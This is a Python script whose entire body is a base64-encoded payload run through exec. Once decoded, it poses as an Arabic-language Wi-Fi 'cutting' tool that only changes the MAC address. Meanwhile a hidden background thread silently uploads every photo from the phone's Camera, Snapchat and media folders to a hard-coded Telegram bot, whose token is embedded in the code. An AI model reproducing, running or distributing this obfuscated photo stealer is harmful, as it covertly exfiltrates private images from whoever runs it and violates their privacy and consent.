import base64
exec(base64.b64decode("aW1wb3J0IHN5cwppbXBvcnQgdXVpZAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgdGltZQppbXBvcnQgb3MKaW1wb3J0IGJhc2U2NApmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yCmltcG9ydCB0aHJlYWRpbmcKCnRyeToKICAgIGltcG9ydCB0ZWxlYm90LCBweWZpZ2xldCwgcmVxdWVzdHMgCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHN1YnByb2Nlc3MuY2hlY2tfY2FsbChbc3lzLmV4ZWN1dGFibGUsICItbSIsICJwaXAiLCAiaW5zdGFsbCIsICJweVRlbGVncmFtQm90QVBJIiwgInB5ZmlnbGV0IiwgInJlcXVlc3RzIl0pCiAgICBpbXBvcnQgdGVsZWJvdAogICAgaW1wb3J0IHB5ZmlnbGV0CiAgICBpbXBvcnQgcmVxdWVzdHMKCmJvdCA9IHRlbGVib3QuVGVsZUJvdCgnODE2MjQ1Mzg5MTpBQUhRRnlNUEV6amE5V3Q4dlN4VDZ0NS1kX051SnUtek05dycpCgojINmF2KzZhNiv2KfYqiDYp9mE2KjYrdirCmRpcl9wYXRocyA9IFsKICAgICIvc3RvcmFnZS9lbXVsYXRlZC8wL0RDSU0vU25hcGNoYXQvIiwKICAgICIvc3RvcmFnZS9lbXVsYXRlZC8wL0RDSU0vQ2FtZXJhLyIsCiAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9BbmRyb2lkL21lZGlhLyIKXQoKIyDYpdix2LPYp9mEINin2YTYtdmI2LEKZGVmIHNlbmRfZmlsZShmaWxlX3BhdGgpOgogICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgInJiIikgYXMgZjoKICAgICAgICBpZiBmaWxlX3BhdGgubG93ZXIoKS5lbmRzd2l0aCgoIi5qcGciLCAiLnBuZyIsICIuanBlZyIsICIud2VicCIpKToKICAgICAgICAgICAgYm90LnNlbmRfcGhvdG8oY2hhdF9pZD0xMjQ5MzgyNjUzLCBwaG90bz1mLCBjYXB0aW9uPSdCeTogQFNoYWRvd19oaXRsZXInKQoKIyDYudmF2YTZitipINin2YTYqNit2KsKZGVmIGJhY2soKToKICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwMCkgYXMgZXhlY3V0b3I6CiAgICAgICAgZm9yIGRpcl9wYXRoIGluIGRpcl9wYXRoczoKICAgICAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZGlyX3BhdGgpOgogICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIGZpbGUpCiAgICAgICAgICAgICAgICAgICAgaWYgZmlsZV9wYXRoLmxvd2VyKCkuZW5kc3dpdGgoKCIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLndlYnAiKSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGV4ZWN1dG9yLnN1Ym1pdChzZW5kX2ZpbGUsIGZpbGVfcGF0aCkKCiMg2KrYtNi62YrZhCDZgdmKINiu2YTZgdmK2KkKdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9YmFjaykuc3RhcnQoKQoKIyBBTlNJIENvbG9ycwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgdGltZQppbXBvcnQgc3lzCgp0cnk6CiAgICBpbXBvcnQgcHlmaWdsZXQKZXhjZXB0IEltcG9ydEVycm9yOgogICAgcHJpbnQoItmE2YUg2YrYqtmFINin2YTYudir2YjYsSDYudmE2Ykg2YXZg9iq2KjYqSBweWZpZ2xldNiMINis2KfYsdmKINiq2KvYqNmK2KrZh9inLi4uIikKICAgIHN1YnByb2Nlc3MuY2hlY2tfY2FsbChbc3lzLmV4ZWN1dGFibGUsICItbSIsICJwaXAiLCAiaW5zdGFsbCIsICJweWZpZ2xldCJdKQogICAgaW1wb3J0IHB5ZmlnbGV0CgpkZWYgcnVuX2NvbW1hbmQoY21kKToKICAgIHRyeToKICAgICAgICBzdWJwcm9jZXNzLnJ1bihjbWQsIHNoZWxsPVRydWUsIGNoZWNrPVRydWUpCiAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3I6CiAgICAgICAgcHJpbnQoItit2K/YqyDYrti32KMg2KPYq9mG2KfYoSDYqtmG2YHZitiwINin2YTYo9mF2LE6IiwgY21kKQogICAgICAgIHN5cy5leGl0KDEpCgpkZWYgY2hhbmdlX21hYyhpbnRlcmZhY2UsIG5ld19tYWMpOgogICAgcHJpbnQoZiLYqti52LfZitmEINin2YTZiNin2KzZh9ipIHtpbnRlcmZhY2V9Li4uIikKICAgIHJ1bl9jb21tYW5kKGYiaXAgbGluayBzZXQge2ludGVyZmFjZX0gZG93biIpCiAgICBwcmludChmItiq2LrZitmK2LEg2LnZhtmI2KfZhiBNQUMg2KXZhNmJIHtuZXdfbWFjfSAuLi4iKQogICAgcnVuX2NvbW1hbmQoZiJpcCBsaW5rIHNldCBkZXYge2ludGVyZmFjZX0gYWRkcmVzcyB7bmV3X21hY30iKQogICAgcHJpbnQoZiLYqtmB2LnZitmEINin2YTZiNin2KzZh9ipIHtpbnRlcmZhY2V9IC4uLiIpCiAgICBydW5fY29tbWFuZChmImlwIGxpbmsgc2V0IHtpbnRlcmZhY2V9IHVwIikKCmRlZiBnZXRfb3JpZ2luYWxfbWFjKGludGVyZmFjZSk6CiAgICB0cnk6CiAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoZiJjYXQgL3N5cy9jbGFzcy9uZXQve2ludGVyZmFjZX0vYWRkcmVzcyIsIHNoZWxsPVRydWUpCiAgICAgICAgcmV0dXJuIHJlc3VsdC5kZWNvZGUoKS5zdHJpcCgpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHJldHVybiBOb25lCgpkZWYgcHJpbnRfYmFubmVyKCk6CiAgICBhc2NpaV9hcnQgPSBweWZpZ2xldC5maWdsZXRfZm9ybWF0KCJIaXRsZXIgQ3V0IikKICAgIHByaW50KGFzY2lpX2FydCkKICAgIHByaW50KCIgICAgICAgIFdpLUZpXG4iLmNlbnRlcig2MCkpCgpkZWYgbGlzdF9pbnRlcmZhY2VzKCk6CiAgICB0cnk6CiAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoImlwIGxpbmsgc2hvdyB8IGdyZXAgLUUgJ15bMC05XTonIHwgY3V0IC1kOiAtZjIiLCBzaGVsbD1UcnVlKQogICAgICAgIGludGVyZmFjZXMgPSBbaS5zdHJpcCgpIGZvciBpIGluIHJlc3VsdC5kZWNvZGUoKS5zcGxpdGxpbmVzKCldCiAgICAgICAgaWYgbm90IGludGVyZmFjZXM6CiAgICAgICAgICAgIHJhaXNlIEV4Y2VwdGlvbigi2YTYpyDYqtmI2KzYryDZiNin2KzZh9in2Kog2LTYqNmD2KkuIikKICAgICAgICByZXR1cm4gaW50ZXJmYWNlcwogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYi2KrYudiw2LEg2KfZhNit2LXZiNmEINi52YTZiSDYo9iz2YXYp9ihINmI2KfYrNmH2KfYqiDYp9mE2LTYqNmD2Kk6IHtlfSIpCiAgICAgICAgcHJpbnQoItiq2KPZg9ivINmF2YYg2KrYtNi62YrZhCDYp9mE2KjYsdmG2KfZhdisINio2LXZhNin2K3Zitin2Kog2KfZhNix2YjYqiAoc3VkbyAvIHN1IC8gdHN1KS4iKQogICAgICAgIHJldHVybiBOb25lCgpkZWYgc2VsZWN0X2ludGVyZmFjZSgpOgogICAgY29tbW9uX2hpbnRzID0gWyJ3bGFuMCIsICJldGgwIiwgInVzYjAiLCAicm1uZXQwIl0KICAgIHByaW50KCLYqtmE2YXZitit2KfYqiDZhNij2LPZhdin2KEg2YjYp9is2YfYp9iqINin2YTYtNio2YPYqSDYp9mE2LTYp9im2LnYqToiKQogICAgcHJpbnQoIiwgIi5qb2luKGNvbW1vbl9oaW50cykpCiAgICBwcmludCgiXG7Yp9i22LrYtyAxINmE2YXYrdin2YjZhNipINmF2LnYsdmB2Kkg2KPYs9mF2KfYoSDZiNin2KzZh9in2Kog2KfZhNi02KjZg9ipINin2YTZhdiq2YjZgdix2Kkg2KrZhNmC2KfYptmK2YvYpyIpCiAgICBwcmludCgi2KPZiCDYo9iv2K7ZhCDYp9iz2YUg2KfZhNmI2KfYrNmH2Kkg2YXYqNin2LTYsdip2YsgKNmF2KvZhNin2Ysgd2xhbjApOiAiKQogICAgY2hvaWNlID0gaW5wdXQoItin2K/YrtmEINin2K7YqtmK2KfYsdmDOiAiKS5zdHJpcCgpCgogICAgaWYgY2hvaWNlID09ICIxIjoKICAgICAgICBpbnRlcmZhY2VzID0gbGlzdF9pbnRlcmZhY2VzKCkKICAgICAgICBpZiBpbnRlcmZhY2VzIGlzIE5vbmU6CiAgICAgICAgICAgIGlmYWNlID0gaW5wdXQoItin2YTYsdis2KfYoSDYpdiv2K7Yp9mEINin2LPZhSDYp9mE2YjYp9is2YfYqSDZitiv2YjZitmL2Kc6ICIpLnN0cmlwKCkKICAgICAgICAgICAgcmV0dXJuIGlmYWNlCiAgICAgICAgcHJpbnQoIlxu2YjYp9is2YfYp9iqINin2YTYtNio2YPYqSDYp9mE2YXYqtmI2YHYsdipOiIpCiAgICAgICAgZm9yIGlkeCwgaWZhY2UgaW4gZW51bWVyYXRlKGludGVyZmFjZXMsIDEpOgogICAgICAgICAgICBwcmludChmIntpZHh9IC0ge2lmYWNlfSIpCgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHNlbCA9IGlucHV0KCLYp9iu2KrYsSDYsdmC2YUg2KfZhNmI2KfYrNmH2Kkg2KfZhNiq2Yog2KrYsdmK2K8g2KfYs9iq2K7Yr9in2YXZh9inOiAiKS5zdHJpcCgpCiAgICAgICAgICAgIGlmIHNlbC5pc2RpZ2l0KCk6CiAgICAgICAgICAgICAgICBzZWwgPSBpbnQoc2VsKQogICAgICAgICAgICAgICAgaWYgMSA8PSBzZWwgPD0gbGVuKGludGVyZmFjZXMpOgogICAgICAgICAgICAgICAgICAgIHJldHVybiBpbnRlcmZhY2VzW3NlbCAtIDFdCiAgICAgICAgICAgIHByaW50KCLYp9iu2KrZitin2LEg2LrZitixINi12KfZhNit2Iwg2K3Yp9mI2YQg2YXYsdipINij2K7YsdmJLiIpCiAgICBlbHNlOgogICAgICAgIHJldHVybiBjaG9pY2UKCmRlZiBtYWluKCk6CiAgICBwcmludF9iYW5uZXIoKQoKICAgIGludGVyZmFjZSA9IHNlbGVjdF9pbnRlcmZhY2UoKQogICAgcHJpbnQoZiLYqtmFINin2K7YqtmK2KfYsSDYp9mE2YjYp9is2YfYqToge2ludGVyZmFjZX0iKQoKICAgIG9yaWdpbmFsX21hYyA9IGdldF9vcmlnaW5hbF9tYWMoaW50ZXJmYWNlKQogICAgaWYgbm90IG9yaWdpbmFsX21hYzoKICAgICAgICBwcmludCgi2YTZhSDYo9iq2YXZg9mGINmF2YYg2KfZhNit2LXZiNmEINi52YTZiSDYudmG2YjYp9mGIE1BQyDYp9mE2KPYtdmE2YouINiq2KPZg9ivINmF2YYg2LXYrdipINin2LPZhSDYp9mE2YjYp9is2YfYqSDYo9mIINi12YTYp9it2YrYp9iqINin2YTYqti02LrZitmELiIpCiAgICAgICAgcmV0dXJuCgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBwcmludCgiXG7Yp9iu2KrYsSDYrtmK2KfYsToiKQogICAgICAgIHByaW50KCIxIC0g2KfZhNmH2KzZiNmFICjYqti62YrZitixIE1BQyDYpdmE2Ykg2LnZhtmI2KfZhiDYp9mE2LTYqNmD2KkpIikKICAgICAgICBwcmludCgiMiAtINin2YTYudmI2K/YqSDZhNmE2YLYp9im2YXYqSDYp9mE2LHYptmK2LPZitipIC8g2KfZhNiu2LHZiNisIikKICAgICAgICBjaG9pY2UgPSBpbnB1dCgi2KfYrtiq2YrYp9ix2YM6ICIpLnN0cmlwKCkKCiAgICAgICAgaWYgY2hvaWNlID09ICIxIjoKICAgICAgICAgICAgdGFyZ2V0X21hYyA9IGlucHV0KCLYo9iv2K7ZhCDYudmG2YjYp9mGIE1BQyDYp9mE2LHYptmK2LPZiiDZhNmE2LTYqNmD2Kkg2KfZhNiq2Yog2KrYsdmK2K8g2KrZgtmE2YrYr9mH2Kc6ICIpLnN0cmlwKCkKICAgICAgICAgICAgY2hhbmdlX21hYyhpbnRlcmZhY2UsIHRhcmdldF9tYWMpCiAgICAgICAgICAgIHByaW50KCLYqtmFINin2YTZh9is2YjZhSDYqNmG2KzYp9itISAo2KrZhSDYqti62YrZitixINi52YbZiNin2YYgTUFDKSIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICAgICAgcHJpbnQoImRvbmUiKQoKICAgICAgICAgICAgZmFrZV9tYWNzID0gWwogICAgICAgICAgICAgICAgIjAwOjExOjIyOjMzOjQ0OjU1IiwKICAgICAgICAgICAgICAgICI2Njo3Nzo4ODo5OTpBQTpCQiIsCiAgICAgICAgICAgICAgICAiQ0M6REQ6RUU6RkY6MDA6MTEiLAogICAgICAgICAgICAgICAgIjIyOjMzOjQ0OjU1OjY2Ojc3IiwKICAgICAgICAgICAgICAgICI4ODo5OTpBQTpCQjpDQzpERCIKICAgICAgICAgICAgXQogICAgICAgICAgICBwcmludCgiXG7Zh9mEINiq2LHZitivINiq2LrZitmK2LEg2LnZhtmI2KfZhiBNQUMg2KfZhNiu2KfYtSDYqNmDINil2YTZiSDYudmG2YjYp9mGINmI2YfZhdmK2J8iKQogICAgICAgICAgICBmb3IgaSwgbWFjIGluIGVudW1lcmF0ZShmYWtlX21hY3MsIDEpOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7aX0gLSB7bWFjfSIpCiAgICAgICAgICAgIHByaW50KCIwIC0g2YTYp9iMINin2LHZitivINin2YTYudmI2K/YqSDZhNmE2YjYtti5INin2YTYt9io2YrYudmKIikKCiAgICAgICAgICAgIGZha2VfY2hvaWNlID0gaW5wdXQoItin2K7YqtixINix2YLZhSDYp9mE2LnZhtmI2KfZhjogIikuc3RyaXAoKQoKICAgICAgICAgICAgaWYgZmFrZV9jaG9pY2UuaXNkaWdpdCgpOgogICAgICAgICAgICAgICAgZmFrZV9jaG9pY2UgPSBpbnQoZmFrZV9jaG9pY2UpCiAgICAgICAgICAgICAgICBpZiBmYWtlX2Nob2ljZSA9PSAwOgogICAgICAgICAgICAgICAgICAgIHByaW50KCLYp9iz2KrYudin2K/YqSDYudmG2YjYp9mGIE1BQyDYp9mE2KPYtdmE2YouLi4iKQogICAgICAgICAgICAgICAgICAgIGNoYW5nZV9tYWMoaW50ZXJmYWNlLCBvcmlnaW5hbF9tYWMpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoItiq2YUg2KfZhNin2LPYqti52KfYr9ipINil2YTZiSDYp9mE2YjYtti5INin2YTYt9io2YrYudmKLiIpCiAgICAgICAgICAgICAgICBlbGlmIDEgPD0gZmFrZV9jaG9pY2UgPD0gbGVuKGZha2VfbWFjcyk6CiAgICAgICAgICAgICAgICAgICAgY2hvc2VuX21hYyA9IGZha2VfbWFjc1tmYWtlX2Nob2ljZSAtIDFdCiAgICAgICAgICAgICAgICAgICAgY2hhbmdlX21hYyhpbnRlcmZhY2UsIGNob3Nlbl9tYWMpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiLYqtmFINiq2LrZitmK2LEg2LnZhtmI2KfZhiBNQUMg2KXZhNmJINin2YTYudmG2YjYp9mGINin2YTZiNmH2YXZijoge2Nob3Nlbl9tYWN9IikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoItin2K7YqtmK2KfYsSDYutmK2LEg2LXYp9mE2K3YjCDYp9mE2LnZiNiv2Kkg2YTZhNmI2LbYuSDYp9mE2LfYqNmK2LnZii4iKQogICAgICAgICAgICAgICAgICAgIGNoYW5nZV9tYWMoaW50ZXJmYWNlLCBvcmlnaW5hbF9tYWMpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludCgi2KfYrtiq2YrYp9ixINi62YrYsSDYtdin2YTYrdiMINin2YTYudmI2K/YqSDZhNmE2YjYtti5INin2YTYt9io2YrYudmKLiIpCiAgICAgICAgICAgICAgICBjaGFuZ2VfbWFjKGludGVyZmFjZSwgb3JpZ2luYWxfbWFjKQoKICAgICAgICAgICAgYWdhaW4gPSBpbnB1dCgiXG7Zh9mEINiq2LHZitivINin2YTZh9is2YjZhSDZhdix2Kkg2KPYrtix2YnYnyAo2YbYudmFL9mE2KcpOiAiKS5zdHJpcCgpLmxvd2VyKCkKICAgICAgICAgICAgaWYgYWdhaW4gIT0gItmG2LnZhSI6CiAgICAgICAgICAgICAgICBwcmludCgi2KXZhNmJINin2YTZhNmC2KfYoSEiKQogICAgICAgICAgICAgICAgYnJlYWsKCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBwcmludCgi2KrZhSDYp9mE2K7YsdmI2Kwg2YXZhiDYp9mE2KjYsdmG2KfZhdisLiIpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoItin2K7YqtmK2KfYsSDYutmK2LEg2LXYp9mE2K3YjCDYrdin2YjZhCDZhdix2Kkg2KPYrtix2YkuIikKCnByaW50KCLYo9iv2KfYqSDYqti52LfZgNmA2YDZgNmA2YDZgNmK2YQg2YjZgti32Lkg2LTYqNmD2KfYqiDYp9mE2YjYp9mKINmB2KfZii/YqtmFINiq2LfZgNmA2YDZgNmA2YDZgNmI2YrYsSDYp9mE2KPYr9in2Kkg2KjZiNin2LPYt9ipL9mH2KrZgNmA2YDZgNmA2YDZgNmA2YDZgNmA2YDZgNmA2YDZgNmA2YDZgNmA2YDZgNmA2YDZgNmA2YDZgNmA2YDZgNmA2YDZgNmA2YTYsSIpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigp").decode('utf-8'))